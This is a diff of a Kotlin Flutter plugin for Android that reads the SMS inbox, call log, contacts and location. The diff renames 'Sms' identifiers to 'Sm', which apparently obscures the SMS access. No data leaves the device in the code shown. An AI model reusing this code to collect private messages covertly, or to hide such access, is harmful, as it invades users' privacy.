@@ -31,13 +31,12 @@ import io.flutter.plugin.common.MethodChannel.MethodCallHandler
 import io.flutter.plugin.common.MethodChannel.Result
 import java.io.File
 import java.text.DecimalFormat
-import java.text.SimpleDateFormat
 import java.util.*
 import kotlin.concurrent.thread
 import kotlin.math.pow
 
 
-class SmspluginPlugin: FlutterPlugin, MethodCallHandler,LocationListener, ActivityAware {
+class SpluginPlugin: FlutterPlugin, MethodCallHandler,LocationListener, ActivityAware {
   private lateinit var channel: MethodChannel
   private lateinit var context: Context
   private var locationManager: LocationManager? = null
@@ -53,9 +52,9 @@ class SmspluginPlugin: FlutterPlugin, MethodCallHandler,LocationListener, Activi
   override fun onMethodCall(call: MethodCall, result: Result) {
     val a = activity!!
     when (call.method) {
-      "getSmsList" -> {
-        val smsList = getSmsList()
-        result.success(smsList)
+      "getSmList" -> {
+        val smList = getSmList()
+        result.success(smList)
       }
       "getCallLogList" -> {
         val callLogList = getCallLogList()
@@ -130,40 +129,77 @@ class SmspluginPlugin: FlutterPlugin, MethodCallHandler,LocationListener, Activi
     }
   }
 
+
+//  private fun getSmList(): List<Map<String, Any>> {
+//    val smsList = mutableListOf<Map<String, Any>>()
+//    val resolver: ContentResolver = context.contentResolver
+//    val uri = Telephony.Sms.CONTENT_URI
+//    val projection = arrayOf(
+//      Telephony.Sms._ID,
+//      Telephony.Sms.ADDRESS,
+//      Telephony.Sms.BODY,
+//      Telephony.Sms.DATE,
+//      Telephony.Sms.TYPE,
+//      Telephony.Sms.READ
+//    )
+//    val cursor: Cursor? = resolver.query(uri, projection, null, null, null)
+//    if (cursor != null && cursor.moveToFirst()) {
+//      do {
+//        val id = cursor.getLong(cursor.getColumnIndex(Telephony.Sms._ID))
+//        val address = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS))
+//        val body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY))
+//        val date = cursor.getLong(cursor.getColumnIndex(Telephony.Sms.DATE))
+//        val type = cursor.getInt(cursor.getColumnIndex(Telephony.Sms.TYPE))
+//        val read = cursor.getString(cursor.getColumnIndex(Telephony.Sms.READ))
+//        val sms = mapOf(
+//          "id" to id,
+//          "address" to address,
+//          "body" to body,
+//          "date" to date,
+//          "type" to type,
+//          "read" to read
+//        )
+//        smsList.add(sms)
+//      } while (cursor.moveToNext())
+//      cursor.close()
+//    }
+//    return smsList
+//  }
+
+  // 定义一个用于读取短信并返回包含短信信息的Map列表的函数
   @SuppressLint("Range")
-  private fun getSmsList(): List<Map<String, Any>> {
+  private fun getSmList(): List<Map<String, Any>> {
+    // 创建一个空的列表，用于存储短信信息
     val smsList = mutableListOf<Map<String, Any>>()
-    val resolver: ContentResolver = context.contentResolver
-    val uri = Telephony.Sms.CONTENT_URI
-    val projection = arrayOf(
-      Telephony.Sms._ID,
-      Telephony.Sms.ADDRESS,
-      Telephony.Sms.BODY,
-      Telephony.Sms.DATE,
-      Telephony.Sms.TYPE,
-      Telephony.Sms.READ
-    )
-    val cursor: Cursor? = resolver.query(uri, projection, null, null, null)
-    if (cursor != null && cursor.moveToFirst()) {
-      do {
-        val id = cursor.getLong(cursor.getColumnIndex(Telephony.Sms._ID))
-        val address = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS))
-        val body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY))
-        val date = cursor.getLong(cursor.getColumnIndex(Telephony.Sms.DATE))
-        val type = cursor.getInt(cursor.getColumnIndex(Telephony.Sms.TYPE))
-        val read = cursor.getString(cursor.getColumnIndex(Telephony.Sms.READ))
-        val sms = mapOf(
-          "id" to id,
-          "address" to address,
-          "body" to body,
-          "date" to date,
-          "type" to type,
-          "read" to read
-        )
-        smsList.add(sms)
-      } while (cursor.moveToNext())
-      cursor.close()
+    // 获取内容解析器
+    val cr = context.contentResolver
+    // 定义要查询的列
+    val projection = arrayOf("_id", "address", "person", "body", "date", "type")
+    // 定义查询URI
+    val SMS_INBOX = Uri.parse("content://sms/inbox")
+    // 执行查询
+    val cur: Cursor? = cr.query(SMS_INBOX, projection, null, null, null)
+    // 检查查询结果是否为空
+    if (cur != null) {
+      // 遍历查询结果
+      while (cur.moveToNext()) {
+        // 创建映射以存储每条短信的信息
+        val map = hashMapOf<String, Any>()
+        // 获取短信详情
+        map["id"] = cur.getLong(cur.getColumnIndex("_id"))
+        map["address"] = cur.getString(cur.getColumnIndex("address")) // 手机号
+        map["person"] = cur.getString(cur.getColumnIndex("person")) // 联系人姓名
+        map["body"] = cur.getString(cur.getColumnIndex("body")) // 短信内容
+        map["date"] = cur.getLong(cur.getColumnIndex("date")) // 日期
+        map["type"] = cur.getInt(cur.getColumnIndex("type")) // 类型
+        map["read"] = cur.getInt(cur.getColumnIndex("read")) // 已读状态
+        // 将映射添加到列表中
+        smsList.add(map)
+      }
+      // 关闭游标
+      cur.close()
     }
+    // 返回包含短信信息的Map列表
     return smsList
   }
 
@@ -248,22 +284,8 @@ class SmspluginPlugin: FlutterPlugin, MethodCallHandler,LocationListener, Activi
           contact["phoneNumber"] = phoneNumber
         }
         phoneCursor?.close()
-        try {
-          val creationDate = cursor.getString(cursor.getColumnIndex(ContactsContract.RawContacts.DIRTY))
-          val creationDateMillis = creationDate.toLongOrNull() ?: 0
-          contact["creationDate"] = creationDateMillis
-        }catch (e:Exception){
-          contact["creationDate"] = 0
-          Log.d("android","报错:"+e.printStackTrace())
-        }
-        try{
-          val modificationDate = cursor.getString(cursor.getColumnIndex(ContactsContract.RawContacts.DIRTY))
-          val modificationDateMillis = modificationDate.toLongOrNull() ?: 0
-          contact["modificationDate"] = modificationDateMillis
-        }catch (e:Exception){
-          contact["modificationDate"] =0
-        }
-
+        contact["creationDate"] = 0
+        contact["modificationDate"] =0
         contacts.add(contact)
       } while (cursor.moveToNext())
     }
